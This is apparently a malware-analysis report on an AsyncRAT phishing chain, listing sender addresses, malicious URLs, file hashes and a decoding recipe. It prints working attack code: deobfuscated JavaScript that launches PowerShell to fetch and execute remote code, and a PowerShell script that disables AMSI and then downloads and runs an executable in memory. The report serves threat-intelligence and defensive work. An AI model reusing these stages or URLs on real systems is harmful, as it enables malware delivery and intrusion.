THREAT IDENTIFICATION:  ASYNCRAT

SUBJECTS OBSERVED
The subject was from a previously stolen email thread.

SENDERS OBSERVED
eugenio.poggi@fpsroma.cisl.it

404 TDS URLS
https://heatherharrington.net/27m/fya/ar9t2zrvmfj

404 TDS REDIRECT URLS
https://wipeuganda.org/wsbfdthfg
https://wipeuganda.org/wsbfdthfg/

JAVASCRIPT FILE DOWNLOAD URLS
https://marketsheadlines.com/wsbfdthfg/

JAVASCRIPT FILE HASH
Papers_5106896.js
2b8479bd2264b4bb670483953e4318f4

DEOBFUSCATED JAVASCRIPT FILE
var pkvundgtzwljobsq = [
    'winmgmts:root\\cimv2:Win32_Process',
    'less powershel',
    'conhost --head',
    "l $goptrwdmycbs=('grep','add-txt','set-width', 'font-extract'); $hykczbfwnqup=@(4056,4041,4043,4058,4059,4062,3987,4057,4052,4053,3988,3990,3987,4053,4045,4053,4004,4045,4038,4056,4045,4002);foreach($f in $hykczbfwnqup){$yxlvbhoeijwt=$yxlvbhoeijwt+[char]($f-3941)};$goptrwdmycbs[2]=$yxlvbhoeijwt; ;$nmfxaj='rl';$five=1;new-alias zwert cu$nmfxaj;.$([char](9992-9887)+'ex')(zwert -useb $goptrwdmycbs[7487-7485])",
    'time',
]
var savgwkdprlhxiftn = ''
var lmbxvrahuzcwgeso = GetObject(pkvundgtzwljobsq[0])
var array = pkvundgtzwljobsq
var arrayLength = array.length
if (false || 9012 >= arrayLength) {
    var cjgdauwplbsyonkx = 0
}
for (var index = 0; index < 9012; index++) {
    var olfhizjdmtgsyena = array[9012 - index + 1]
    var dpgitbrkqxwznula = array[9012 - index]
    var bykrixntfhjzpuoc = array[9012 - index + 2]
    cjgdauwplbsyonkx = olfhizjdmtgsyena + dpgitbrkqxwznula + bykrixntfhjzpuoc
}
savgwkdprlhxiftn = cjgdauwplbsyonkx

FIRST POWERSHELL SCRIPT DOWNLOAD URL
http://sdfuvy.top/1.php?hash=

FIRST DOWNLOADED POWERSHELL SCRIPT FILE HASH
1.php%3fhash=
dc7df96f6b43d43169941badd9010316

CYBERCHEF DECODE RECIPE FOR THE BASE64 BLOB IN THE FIRST PS SCRIPT
From_Base64('A-Za-z0-9+/=',true,false)
XOR({'option':'Latin1','string':'gu5mdkh62tex'},'Standard',false)
Gunzip()

XOR KEY
gu5mdkh62tex

SECOND DOWNLOADED POWERSHELL SCRIPT URL
http://sdfuvy.top/2.php?id=RAT-CATCHER&key=50455163003

SECOND DOWNLOADED POWERSHELL SCRIPT FILE HASH
2.php%3fid=RAT-CATCHER&key=50455163003
f832747cfa3316c3345fada27593d95b

SECOND POWERSHELL SCRIPT
$Q=$null;$acce="$(('Syst'+'em').NorMaLizE([CHar]([byTe]0x46)+[chAr](46+65)+[CHar]([BYte]0x72)+[cHAR]([bYtE]0x6d)+[CHaR]([bytE]0x44)) -replace [CHAr]([ByTE]0x5c)+[cHaR]([bYtE]0x70)+[ChAR](123)+[chaR](77)+[cHAR](110+19-19)+[chAR]([byTE]0x7d)).$(('Mânãgeme'+'nt').normALiZE([CHar]([bYTe]0x46)+[CHAr](41+70)+[CHaR]([bytE]0x72)+[ChaR]([ByTE]0x6d)+[CHar](68+11-11)) -replace [CHaR]([bytE]0x5c)+[ChAR](112)+[Char](123+74-74)+[cHAr]([Byte]0x4d)+[CHAr](97+13)+[CHAR](125*89/89)).$(('Á'+'u'+'t'+'õ'+'m'+'â'+'t'+'î'+'ô'+'n').NOrmAlIZE([cHaR](70)+[CHAR]([BYTe]0x6f)+[cHar](114+105-105)+[ChAr]([BYtE]0x6d)+[ChaR]([BYte]0x44)) -replace [CHAr](92)+[cHAr](112*93/93)+[CHAr](123)+[char](77)+[cHAr]([byte]0x6e)+[ChaR](125*47/47)).$(('ÀmsìUt'+'îls').noRmAlize([char](70+6-6)+[CHAR]([bYte]0x6f)+[cHar](86+28)+[cHAR](109)+[cHar]([byTE]0x44)) -replace [CHaR]([bYtE]0x5c)+[chAr](112*84/84)+[ChaR](123*9/9)+[cHaR]([BytE]0x4d)+[CHAr](110+101-101)+[chaR](125*35/35))";$piooz="+('ydml'+'ftbg'+'mejg'+'nrrh'+'cpvs'+'vrîx').NOrmalizE([ChAR](70+28-28)+[ChAr]([bYTE]0x6f)+[Char](6+108)+[CHaR]([bYTe]0x6d)+[cHaR](68*41/41)) -replace [Char]([byTE]0x5c)+[ChAR]([BytE]0x70)+[chAr](123)+[chaR](77*12/12)+[ChAR](110+73-73)+[ChAr]([BytE]0x7d)";[Threading.Thread]::Sleep(833);[Ref].Assembly.GetType($acce).GetField($(('ámsíÎ'+'nìtFä'+'îled').NorMalizE([cHAR]([byte]0x46)+[CHaR]([BYTe]0x6f)+[chAr](114*62/62)+[CHar]([bYTE]0x6d)+[chAR](68)) -replace [cHar]([byte]0x5c)+[chAR]([BytE]0x70)+[Char]([bYTE]0x7b)+[cHAR]([Byte]0x4d)+[chAr]([BYTE]0x6e)+[cHAR](125+102-102)),"NonPublic,Static").SetValue($Q,$true);

$url = "https://temp.sh/bfseS/ruzxs.exe"

$client = New-Object System.Net.WebClient

    # Download the assembly bytes
    $assemblyBytes = $client.DownloadData($url)

    # Load the assembly into memory
    $assembly = [System.Reflection.Assembly]::Load($assemblyBytes)

    # Execute the entry point of the assembly
    $entryPoint = $assembly.EntryPoint
    $entryPoint.Invoke($null, @())

PAYLOAD DOWNLOAD URL
https://temp.sh/bfseS/ruzxs.exe

PAYLOAD FILE HASH
The url is down (likely, I was filtered).

ASYNCRAT C2
I did not get a payload



